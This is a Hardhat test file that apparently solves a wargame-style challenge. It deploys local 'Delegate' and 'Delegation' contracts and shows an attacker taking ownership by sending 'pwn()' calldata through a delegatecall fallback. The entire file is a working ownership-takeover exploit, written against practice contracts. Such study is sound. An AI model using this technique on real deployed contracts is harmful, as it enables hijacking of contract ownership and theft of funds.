import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { Delegate, Delegation } from "../../typechain";

describe("DelegationAttack", function () {
  let DelegationToken;
  let DelegateToken;
  let delegation: Delegation;
  let delegate: Delegate;
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  beforeEach(async function () {
    DelegateToken = await ethers.getContractFactory("Delegate");
    DelegationToken = await ethers.getContractFactory("Delegation");
    [owner, attacker] = await ethers.getSigners();
    delegate = await DelegateToken.connect(owner).deploy(owner.address);
    delegation = await DelegationToken.connect(owner).deploy(delegate.address);
  });

  describe("attack", function () {
    it("should transfer ownership", async function () {
      const ABI = ["function pwn() public"];
      const iface = new ethers.utils.Interface(ABI);

      const tx = await attacker.sendTransaction({
        from: attacker.address,
        to: delegation.address,
        data: iface.encodeFunctionData("pwn"),
      });

      await tx.wait();

      const delegatedOwner = await delegation.owner();
      expect(delegatedOwner).to.equals(attacker.address);
    });
  });
});
